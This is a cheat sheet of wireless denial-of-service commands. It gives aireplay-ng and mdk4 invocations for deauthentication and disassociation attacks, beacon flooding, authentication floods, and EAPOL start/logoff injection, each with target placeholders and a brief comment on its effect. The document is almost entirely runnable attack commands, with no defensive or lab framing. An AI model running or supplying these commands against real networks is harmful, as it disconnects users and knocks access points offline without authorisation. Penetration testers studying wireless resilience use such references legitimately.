

----
##  [+] Mdk4 - WiFi Denial of Service

## Deauthentication / Disassociation

##  [+] Mdk4 - Deauthentication Attack:

aireplay-ng --deauth 0 -c <MAC_target> -a <MAC_AP> mon0  # Infinite amount of deauth attacks
aireplay-ng --deauth 5 -c <MAC_target> -a <MAC_AP> mon0  # 5 deauth attacks


##  [+] Mdk4 - Deauthentication + Disassociation Attack:

mdk4 mon0 d -b <MAC_AP_file> -c <channel>  # MAC_AP_file stores MAC address of AP. All clients connected to the AP will be targeted
mdk4 mon0 d -c <channel> -b <victim_client_mac.txt> -E <SSID> -B <MAC_AP>  # victim_client_mac.txt contains MAC of device to disconnect
mdk4 mon0 d -c <channel> -E <SSID>  # Simple. Disconnect all clients connected on AP with SSID


##  [+] Mdk4 -  Beacon Flooding

Generate many fake APs by sending lots of beacon frames -> Confuse clients, can crash network scanners & drivers

mdk4 mon0 b
mdk4 mon0 b -s 1000 	# Increased speed
mdk4 mon0 b -m -w ta	# Use valid AP MAC & only create WPA/WPA2 networks
mdk4 mon0 b -a -w nta -m


##  [+] Mdk4 - Authentication DoS

Send authentication frames to all APs found in range -> Too many clients can freeze or reset several APs

mdk4 mon0 a -m
mdk4 mon0 a -m -a <MAC_AP>  # Only target specified AP (random data from random clients)
mdk4 mon0 a -m -i <MAC_AP>  # Only target specified AP + Intelligent test (capture & repeat data packet from connected clients)



## EAPOL Start & Logoff Packet Injection

Flood AP with EAPOL Start frames to keep it busy with fake sessions -> disable handling of any legitimate clients:


mdk4 mon0 e -t <MAC_AP>


##  [+] Mdk4 -  Inject fake EAPOL Logoff messages -> Kick clients from AP:

mdk4 mon0 e -t <MAC_AP> -l